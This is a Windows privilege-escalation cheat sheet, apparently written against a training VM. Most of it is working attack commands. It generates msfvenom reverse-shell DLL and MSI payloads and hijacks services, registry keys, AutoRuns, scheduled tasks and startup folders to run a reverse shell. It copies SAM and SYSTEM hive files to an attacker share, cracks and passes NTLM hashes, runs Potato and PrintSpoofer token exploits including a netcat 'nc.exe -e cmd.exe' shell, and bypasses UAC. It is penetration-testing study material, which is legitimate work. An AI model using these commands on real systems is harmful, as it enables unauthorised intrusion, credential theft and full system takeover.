# Windows Privesc

## <mark style="color:red;">Introduction</mark>

1. Use the "whoami" and "net user" commands to check your user account and group memberships, respectively.
2. To search for potential vulnerabilities and escalation opportunities on a Windows system, run the WinPEAS tool with the "fast," "searchfast," and "cmd" options.
3. Run Seatbelt and other scripts that can help identify security-related concerns and potential vulnerabilities for privilege escalation.

Take some time to review the results of your enumeration. If tools like WinPEAS uncover something interesting, take note of it. To avoid getting sidetracked, create a checklist of items necessary for the privilege escalation method to work.

Do a quick search for files on the user's desktop and other common locations, like C:\ or C:\Program Files. When you find interesting files, read through them as they may have valuable information that could help you escalate privileges.

First, try simpler methods such as registry exploits and services that don't require many steps. Look closely at admin processes and note their versions while searching for vulnerabilities. Check for internal ports that you can forward to your attacking machine.

If you still don't have an admin shell, review your entire enumeration report and highlight anything that seems unusual. This could be an unfamiliar process or file name, or even a username. At this point, consider Kernel Exploits as well.

## <mark style="color:red;">Enumeration Resources</mark>

### <mark style="color:blue;">winPeas (recommended)</mark>

winPEAS not only actively hunts for privilege escalation. It **highlights misconfigurations** for the user in the results.&#x20;

It is available here:&#x20;

{% embed url="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312" %}

Before running on Windows, we need to add a registry key and then reopen the command prompt in order to **see colors** (not necessary on Linux):

```
> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Run all checks while avoiding time-consuming searches:

```
> .\winPEASany.exe quiet cmd fast
```

Run specific check categories:

```
> .\winPEASany.exe quiet cmd systeminfo
```

### <mark style="color:blue;">accesschk.exe</mark>

AccessChk is an old but still trustworthy tool for checking user access control rights. You can use it to check whether a user or group has access to files, directories, services, and registry keys. The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.

{% embed url="https://download.sysinternals.com/files/AccessChk.zip" %}
You must get an older version which still has an /accepteula command line option
{% endembed %}

<mark style="color:blue;">PowerUp</mark>

PowerUp is available here:&#x20;

{% embed url="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1" %}

To use PowerUp, open a PowerShell session and load the script using dot sourcing:

```
PS> . .\PowerUp.ps1
```

Or import module:

```
import-module .\powerup.ps1
```

Execute the Invoke-AllChecks function to initiate the process of detecting common misconfigurations that can lead to privilege escalation:

```
PS> Invoke-AllChecks
```

### <mark style="color:blue;">PowerView</mark>

PowerView [tips](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).

PowerView [commands](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview).

### <mark style="color:blue;">SharpUp</mark>

SharpUp [project](https://github.com/GhostPack/SharpUp).&#x20;

SharpUp [pre-compiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe).

To run SharpUp, start a command prompt and run the executable:

```
> .\SharpUp.exe 
```

As soon as SharpUp is executed, it will begin checking for the same misconfigurations that PowerUp looks for.

### <mark style="color:blue;">SeatBelt</mark>

Seatbelt is a system enumeration tool that performs various checks to identify potential vulnerabilities and security-related issues.

Download from [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe).

To run all checks and filter out unimportant results:

```
> .\Seatbelt.exe all 
```

To run specific check(s): .

```
> \Seatbelt.exe <check> <check> ...
```

### <mark style="color:blue;">windows-privesc-check</mark>

Source available [here](https://github.com/pentestmonkey/windows-privesc-check).

```
c:\> windows-privesc-check2.exe --dump -G
```

## <mark style="color:red;">From ADMIN to SYSTEM</mark>

To escalate from an admin user to full SYSTEM privileges, you can use the [PsExec ](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)tool from Windows Sysinternals.

```
> .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
```

## <mark style="color:red;">Finding Kernel Exploits</mark>

Finding and using kernel exploits is usually a simple process:

1. Enumerate Windows version / patch level (systeminfo).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run. Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

### <mark style="color:blue;">Windows Exploit Suggester</mark>

Windows Exploit Suggester:&#x20;

{% embed url="https://github.com/bitsadmin/wesng" %}

Precompiled Kernel Exploits:&#x20;

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities:&#x20;

{% embed url="https://github.com/rasta-mouse/Watson" %}

(Note: These steps are for Windows 7)

1. Extract the output of the systeminfo command:

```
> systeminfo > systeminfo.txt
```

2. Run wesng on kali to find potential exploits:

```
# python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```

3. Cross-reference results with compiled exploits:&#x20;

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

4. Download the compiled exploit for CVE-2018-8210 onto the Windows VM:&#x20;

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe" %}

4. Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with SYSTEM privileges:

<pre><code><strong>> .\x64.exe C:\PrivEsc\reverse.exe
</strong></code></pre>

## <mark style="color:red;">Service Exploits</mark>

Query the configuration of a service:

```
> sc.exe qc <name>
```

Query the current status of a service:

```
> sc.exe query <name>
```

Modify a configuration option of a service:

```
> sc.exe config <name> <option>= <value>
```

Start/Stop a service:

```
> net start/stop <name>
```

You could also need to reboot restart the machine to restart the service:

```
shutdown /r /t 0
```

### <mark style="color:blue;">Insecure Service Permissions</mark>

Each service has an ACL which defines certain service-specific permissions:

1. Some permissions are innocuous (e.g. SERVICE\_QUERY\_CONFIG, SERVICE\_QUERY\_STATUS).
2. Some may be useful (e.g. SERVICE\_STOP, SERVICE\_START).&#x20;
3. Some are dangerous (e.g. SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS)

{% hint style="info" %}
Be cautious of **potential rabbit holes** when attempting to escalate privileges. For instance, if you can modify the configuration of a service but are unable to start or stop it, it's possible that you may not be able to escalate privileges.
{% endhint %}

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.

1. Run winPEAS to check for service misconfigurations:

```
> .\winPEASany.exe quiet servicesinfo
```

2. Note that we can modify the “daclsvc” service.
3. We can confirm this with accesschk.exe:

```
> .\accesschk.exe /accepteula -uwcqv user daclsvc
```

4. Check the current configuration of the service:

```
> sc qc daclsvc
```

5. Check the current status of the service:

```
> sc query daclsvc
```

6. Reconfigure the service to use our reverse shell executable:

```
> sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
```

7. Start a listener on Kali, and then start the service to trigger the exploit:

```
> net start daclsvc
```

8. You could also need to reboot the machine to restart the service:

```
shutdown /r /t 0
```

### <mark style="color:blue;">Unquoted Service Path</mark>

1. Run winPEAS to check for service misconfigurations:

```
> .\winPEASany.exe quiet servicesinfo
```

2. Note that the “unquotedsvc” service has an unquoted path that also contains spaces: C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
3. Confirm this using sc:

```
> sc qc unquotedsvc
```

4. Use accesschk.exe to check for write permissions:

```
> .\accesschk.exe /accepteula -uwdq C:\
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

5. Copy the reverse shell executable and rename it appropriately:

```
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

6. Start a listener on Kali, and then start the service to trigger the exploit:

```
> net start unquotedsvc
```

7. You could also need to reboot the machine to restart the service:

```
shutdown /r /t 0
```

### <mark style="color:blue;">Weak Registry Permissions</mark>

The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

1. Run winPEAS to check for service misconfigurations:

```
> .\winPEASany.exe quiet servicesinfo
```

2. Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:

```
> powershell -exec bypass
```

```
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

3. Alternatively accesschk.exe can be used to confirm:

```
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

4. Overwrite the ImagePath registry key to point to our reverse shell executable:

```
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

5. Start a listener on Kali, and then start the service to trigger the exploit:

```
> net start regsvc
```

6. You could also need to reboot the machine to restart the service:

```
shutdown /r /t 0
```

### <mark style="color:blue;">Insecure Service Executables</mark>

1. Run winPEAS to check for service misconfigurations:

```
> .\winPEASany.exe quiet servicesinfo
```

2. Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).

```
> sc qc filepermsvc
```

3. Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:

```
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

4. Let's check if we can start and stop the service:

```
> .\accesschk.exe /accepteula -uvqc filepermsvc
```

5. Create a backup of the original service executable:

```
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```

6. Copy the reverse shell executable to overwrite the service executable:

```
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

7. Start a listener on Kali, and then start the service to trigger the exploit:

```
> net start filepermsvc
```

8. You could also need to reboot the machine to restart the service:

```
shutdown /r /t 0
```

### <mark style="color:blue;">DLL Hijacking</mark>

1. Use winPEAS to enumerate non-Windows services:

```
> .\winPEASany.exe quiet servicesinfo
```

2. Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:

```
> .\accesschk.exe /accepteula -uvqc user dllsvc
```

3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:

```
> sc qc dllsvc
```

4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
5. Add a new filter on the Process Name matching dllhijackservice.exe.
6. On the main screen, deselect registry activity and network activity.
7. Start the service:

```
> net start dllsvc
```

8. Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the hijackme.dll file.
9. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.
10. On Kali, generate a reverse shell DLL named hijackme.dll:

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
```

11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:

```
> net stop dllsvc
> net start dllsvc
```

## <mark style="color:red;">Registry Exploits</mark> <a href="#registry" id="registry"></a>

### <mark style="color:blue;">AutoRuns</mark>

Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

1. Use winPEAS to check for writable AutoRun executables:

```
> .\winPEASany.exe quiet applicationsinfo
```

2. Alternatively, we could manually enumerate the AutoRun executables:

```
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

3. and then use accesschk.exe to verify the permissions on each one:

```
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

4. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:

```
> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

5. Copy our reverse shell executable to overwrite the AutoRun executable:

```
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

6. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.

### <mark style="color:blue;">AlwaysInstallElevated</mark>

MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work.

The “**AlwaysInstallElevated**” value must be set to 1 for both&#x20;

1. the **local machine**: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer&#x20;
2. and the **current user**: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer&#x20;

If either of these are missing or disabled, the exploit will not work.

1. Use winPEAS to see if both registry values are set:

```
> .\winPEASany.exe quiet windowscreds
```

2. Alternatively, verify the values manually:

```
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
```

4. Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:

```
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

## <mark style="color:red;">Passwords</mark>

The following commands will search the registry for keys and values that contain “password”:

```
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
```

This usually generates a lot of results, so often it is more fruitful to look in known locations.

1. Use winPEAS to check common password locations:

```
> .\winPEASany.exe quiet filesinfo userinfo
```

2. The results show both AutoLogon credentials and Putty session credentials for the admin user (admin/password123).
3. We can verify these manually:

```
> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

4. On Kali, we can use the winexe command to spawn a shell using these credentials:

```
# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```

5. We can also obtain a system shell using the admin user with winexe:

```
# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
```

### <mark style="color:blue;">Saved Credentials</mark>

Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

1. Use winPEAS to check for saved credentials:

```
> .\winPEASany.exe quiet cmd windowscreds
```

2. It appears that saved credentials for the admin user exist.&#x20;
3. We can verify this manually using the following command:

```
> cmdkey /list
```

4. If the saved credentials aren’t present, run the following script to refresh the credential:

```
> C:\PrivEsc\savecred.bat
```

5. We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:

```
> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### <mark style="color:blue;">Searching for Configuration Files</mark>

Some administrators will leave configurations files on the system with passwords in them.

Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:

```
> dir /s *pass* == *.config
```

Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:

```
> findstr /si password *.xml *.ini *.txt
```

1. Use winPEAS to search for common files which may contain credentials:

```
> .\winPEASany.exe quiet cmd searchfast filesinfo
```

2. The Unattend.xml file was found. View the contents:

```
> type C:\Windows\Panther\Unattend.xml
```

3. Found the credentials inside the file we can simply use winexe to spawn a shell as the admin user, or system

### <mark style="color:blue;">SAM/SYSTEM Files</mark>

Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.

The SAM and SYSTEM files are located in the **C:\Windows\System32\config** directory. The files are locked while Windows is running. Backups of the files may exist in the following directories:

* &#x20;C:\Windows\Repair
* &#x20;C:\Windows\System32\config\RegBack

1. Backups of the SAM and SYSTEM files can be found in C:\Windows\Repair and are readable by our user.
2. Copy the files back to Kali:

```
> copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
> copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
```

We can also extract a copy of the SAM and SYSTEM files using reg.exe:

```
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
```

3. Starting with secretsdump.py (**recommended**), which is also part of the Impacket Suite of Tools, we can dump the NL and NTLM hashes using the following command:

```
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

We can alternatively use samdump2 (**not recommended**) to dump the hashes the same way, the command is simply:

```
# samdump2 SYSTEM SAM
```

4. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:

```
# python3 creddump7/pwdump.py SYSTEM SAM
```

5. Crack the admin user hash using hashcat:

```
# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

### <mark style="color:blue;">Passing the Hash</mark>

We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash.

1. Extract the admin hash from the SAM in the previous step.
2. Use the hash with pth-winexe to spawn a command prompt:

```
# pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```

3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:

```
# pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```

## <mark style="color:red;">Scheduled Tasks</mark>

List all scheduled tasks your user can see:

```
> schtasks /query /fo LIST /v
```

In PowerShell:

```
PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.

1. In the C:\DevTools directory, there is a PowerShell script called “CleanUp.ps1”. View the script:

```
> type C:\DevTools\CleanUp.ps1
```

2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:

```
> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

It appears we have the ability to write to this file.

3. Backup the script:

```
> copy C:\DevTools\CleanUp.ps1 C:\Temp\
```

4. Start a listener on Kali.
5. Use echo to append a call to our reverse shell executable to the end of the script:

```
> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.

## <mark style="color:red;">Insecure GUI Apps (Citrix Method)</mark>

In earlier versions of Windows, it was possible for users to be authorized to run certain GUI applications with administrative privileges. There are typically multiple ways to generate command prompts from within GUI applications, including using built-in Windows functionality. As the parent process runs with administrative privileges, any command prompts generated will also be executed with these privileges. This technique is often referred to as the "Citrix Method" because it uses many of the same methods employed to escape from Citrix environments.

1. Log into the Windows VM using the GUI with the “user” account.
2. Double click on the “AdminPaint” shortcut on the Desktop.
3. Open a command prompt and run:

```
> tasklist /V | findstr mspaint.exe
```

Note that mspaint.exe is running with admin privileges.

4. In Paint, click File, then Open.
5. In the navigation input, replace the contents with:

```
file://c:/windows/system32/cmd.exe
```

6. Press Enter. A command prompt should open running with admin privileges.

## <mark style="color:red;">Startup Apps</mark>

Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: **C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp** If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file:

{% code title="CreateShortcut.vbs" %}
```visual-basic
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```
{% endcode %}

1. Use accesschk.exe to check permissions on the StartUp directory:

```
> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

2. Note that the BUILTIN\Users group has write access to this directory.
3. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
4. Run the script using cscript:

```
> cscript CreateShortcut.vbs
```

5. Start a listener on Kali, then log in as the admin user to trigger the exploit.

## <mark style="color:red;">Installed Applications</mark>

Most privilege escalations relating to installed applications are based on misconfigurations we have already covered. Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.

Manually enumerate all running programs:

```
> tasklist /v
```

We can also use Seatbelt to search for nonstandard processes:

```
> .\seatbelt.exe NonstandardProcesses
```

winPEAS also has this ability (note the misspelling):

```
> .\winPEASany.exe quiet procesinfo
```

Once you find an interesting process, try to identify its version. You can try running the executable with /? or -h, as well as checking config or text files in the Program Files directory. Use Exploit-DB to search for a corresponding exploit. Some exploits contain instructions, while others are code that you will need to compile and run.

## <mark style="color:red;">Hot Potato</mark>

Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

{% hint style="info" %}
These steps are for Windows 7
{% endhint %}

1. Copy the potato.exe exploit executable over to Windows.
2. Start a listener on Kali.
3. Run the exploit:

```
.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

4. Wait for a Windows Defender update, or trigger one manually.

## <mark style="color:red;">Service Accounts (Rotten Potato / Juicy Potato)</mark>

### <mark style="color:blue;">Rotten Potato</mark>

The original Rotten Potato exploit was identified in 2016. Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled.

### <mark style="color:blue;">Juicy Potato</mark>

Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.&#x20;

Juicy Potato is available here:&#x20;

{% embed url="https://github.com/ohpe/juicy-potato" %}

{% file src="../.gitbook/assets/juicy-potato-master.zip" %}

{% hint style="info" %}
These steps are for Windows 7
{% endhint %}

1. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.
2. Start a listener on Kali.
3. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:

```
> C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

4. Start another listener on Kali.
5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:

```
> C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

6. If the CLSID ({03ca...) doesn’t work for you, either check this list or run the **GetCLSID.ps1 PowerShell script**.:&#x20;

{% embed url="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" %}

### <mark style="color:blue;">SeImpersonatePrivilege</mark>

Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled.

For most recent Windows builds we can user PrintSpoofer.exe instead JuicyPotato.exe.

#### Access Token Abuse

Abuse is possible if SeImpersonatePrivilege or SeAssignPrimaryPrivilege is enabled.

* Windows CLSIDs: [http://ohpe.it/juicy-potato/CLSID/](http://ohpe.it/juicy-potato/CLSID/)

#### <mark style="color:yellow;">JuicyPotato - All older versions of Windows</mark>

```powershell
# edit nc.bat with correct params and transfer to remote host
cmd> whoami /priv
cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c

# Exploit failed - incorrect CLSID
Testing {4991D34B-80A1-4291-B697-000000000000} 443
COM -> recv failed with error: 10038

# Exploit worked - correct CLSID
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 443
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

#### <mark style="color:yellow;">PrintSpoofer - Windows 10 and Server 2016/2019</mark>

**PrintSpoofer.exe** is available here:&#x20;

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

* Leverages the Print Spooler service to get a SYSTEM token, then run a custom command

```
# spawn a SYSTEM command prompt
cmd> printspoofer.exe -i -c cmd

# get a SYSTEM reverse shell
cmd> printspoofer.exe -c "C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe"
```

## <mark style="color:red;">Port Forwarding</mark>

Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port. In these cases we need to forward a port on Kali to the internal port on Windows. We can do this using a program called plink.exe (from the makers of PuTTY).

The general format of a port forwarding command using plink.exe:

```
> plink.exe <user>@<kali> -R <kali-port>:<target-IP>:<target-port>
```

Note that the is usually local (e.g. 127.0.0.1). plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.

1. First, test that we can still login remotely via winexe:

```
# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```

2. Using an administrator command prompt, re-enable the firewall:

```
> netsh advfirewall set allprofiles state on
```

3. Confirm that the winexe command now fails.
4. Copy the plink.exe file across to Windows, and then kill the SMB Server on Kali (if you are using it).
5. Make sure that the SSH server on Kali is running and accepting root logins. Check that the “PermitRootLogin yes” option is uncommented in /etc/ssh/sshd\_config. Restart the SSH service if necessary.
6. On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:

```
> plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
```

7. On Kali, modify the winexe command to point to localhost (or 127.0.0.1) instead, and execute it to get a shell via the port forward:

```
# winexe -U 'admin%password123' //localhost cmd.exe
```

## <mark style="color:red;">getsystem (Named Pipes & Token Duplication)</mark>

### <mark style="color:blue;">Access Tokens</mark>

Access Tokens are special objects in Windows which store a user’s identity and privileges. Primary Access Token – Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access token is copied and attached to the new process. Impersonation Access Token – Created when a process or thread needs to temporarily run with the security context of another user.

### <mark style="color:blue;">Token Duplication</mark>

Windows allows processes/threads to duplicate their access tokens. An impersonation access token can be duplicated into a primary access token this way. If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.

### <mark style="color:blue;">Named Pipes</mark>

You may be already familiar with the concept of a “pipe” in Windows & Linux:

```
> systeminfo | findstr Windows
```

A named pipe is an extension of this concept. A process can create a named pipe, and other processes can open the named pipe to read or write data from/to it. The process which created the named pipe can impersonate the security context of a process which connects to the named pipe.

### <mark style="color:blue;">getsystem</mark>

The “getsystem” command in Metasploit’s Meterpreter shell has an almost mythical status. By running this simple command, our privileges are almost magically elevated to that of the SYSTEM user. What does it actually do?

The source code for the getsystem command can be found here:&#x20;

{% embed url="https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter/source/extensions/priv" %}

Three files are worth looking through: elevate.c, namedpipe.c, and tokendup.c There are 3 techniques getsystem can use to “get system”.

getsystem was designed as a tool to escalate privileges from a local admin to SYSTEM. The Named Pipe techniques require local admin permissions. The Token Duplication technique only requires the SeDebugPrivilege privilege, but is also limited to x86 architectures. getsystem should not be thought of as a user -> admin privilege escalation method in modern systems.

#### <mark style="color:yellow;">Named Pipe Impersonation (In Memory/Admin)</mark>

Creates a named pipe controlled by Meterpreter. Creates a service (running as SYSTEM) which runs a command that interacts directly with the named pipe. Meterpreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context). The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges.

#### <mark style="color:yellow;">Named Pipe Impersonation (Dropper/Admin)</mark>

Very similar to Named Pipe Impersonation (In Memory/Admin). Only difference is a DLL is written to disk, and a service created which runs the DLL as SYSTEM. The DLL connects to the named pipe.

#### <mark style="color:yellow;">Token Duplication (In Memory/Admin)</mark>

This technique requires the “SeDebugPrivilege”. It finds a service running as SYSTEM which it injects a DLL into. The DLL duplicates the access token of the service and assigns it to Meterpreter. Currently this only works on x86 architectures. This is the only technique that does not have to create a service, and operates entirely in memory.

## <mark style="color:red;">User Privileges</mark>

In Windows, user accounts and groups can be assigned specific “privileges”. These privileges grant access to certain abilities. Some of these abilities can be used to escalate our overall privileges to that of SYSTEM. Highly detailed paper:&#x20;

{% embed url="https://github.com/hatRiot/token-priv" %}

The whoami command can be used to list our user’s privileges, using the /priv option:&#x20;

`whoami /priv`&#x20;

Note that “disabled” in the state column is irrelevant here. If the privilege is listed, your user has it.

### <mark style="color:blue;">SeAssignPrimaryPrivilege</mark>

The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege. It enables a user to assign an access token to a new process. Again, this can be exploited with the Juicy Potato exploit.

### <mark style="color:blue;">SeBackupPrivilege</mark>

The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL. Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.

### <mark style="color:blue;">SeRestorePrivilege</mark>

The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege:&#x20;

* Modify service binaries.&#x20;
* Overwrite DLLs used by SYSTEM processes&#x20;
* Modify registry settings.

### <mark style="color:blue;">SeTakeOwnershipPrivilege</mark>

The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE\_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.

### <mark style="color:blue;">Other Privileges (More Advanced)</mark>

* SeTcbPrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeDebugPrivilege (used by getsystem)

## <mark style="color:red;">UAC BYPASS</mark>

{% embed url="https://github.com/CsEnox/EventViewer-UACBypass" %}

### <mark style="color:blue;">EventViewer-UACBypass</mark>

#### Usage

```
PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1

PS C:\Windows\Tasks> Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe

